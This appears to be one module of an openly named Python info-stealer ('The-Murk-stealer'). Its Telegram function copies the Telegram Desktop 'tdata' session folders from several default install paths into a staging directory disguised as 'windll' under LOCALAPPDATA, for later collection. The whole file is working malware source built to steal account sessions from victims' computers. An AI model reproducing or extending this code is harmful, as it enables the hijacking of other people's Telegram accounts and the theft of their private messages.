#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
import os
from shutil import copytree,ignore_patterns
from manager.logger import Log

def Telegram(data):
    roaming = os.getenv('APPDATA')
    pathToLogs = f"{os.getenv('LOCALAPPDATA')}\\windll\\Telegram"
    dirs=[
        roaming+"\\Telegram Desktop\\tdata",
        'D:\\Telegram Desktop\\tdata',
        'C:\\Program Files\\Telegram Desktop\\tdata'
    ]
    try:
        for dir in dirs:
            copytree(dir,pathToLogs,ignore = ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))
    except Exception as e:
        Log(f"Telegram {dir} ---> {e}")
    data.append("\n∟📨Telegram")
    return data